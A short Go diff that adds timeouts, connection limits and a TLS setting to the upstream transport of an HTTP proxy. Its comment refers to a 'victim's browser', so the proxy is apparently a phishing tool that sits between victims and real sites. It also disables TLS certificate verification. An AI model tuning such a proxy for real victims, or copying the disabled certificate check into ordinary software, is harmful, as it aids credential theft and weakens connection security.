@@ -130,6 +130,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		WriteTimeout: httpWriteTimeout,
 	}
 
+	// Set aggressive timeouts on the upstream transport so a slow/dead
+	// origin server never hangs the victim's browser indefinitely.
+	p.Proxy.Tr = &http.Transport{
+		DialContext: (&net.Dialer{
+			Timeout:   15 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: 30 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+		IdleConnTimeout:       90 * time.Second,
+		MaxIdleConns:          256,
+		MaxIdleConnsPerHost:   16,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+	}
+
 	if cfg.proxyConfig.Enabled {
 		if len(cfg.proxyConfig.Proxies) > 0 {
 			px := cfg.proxyConfig.Proxies[cfg.proxyConfig.CurrentIndex]
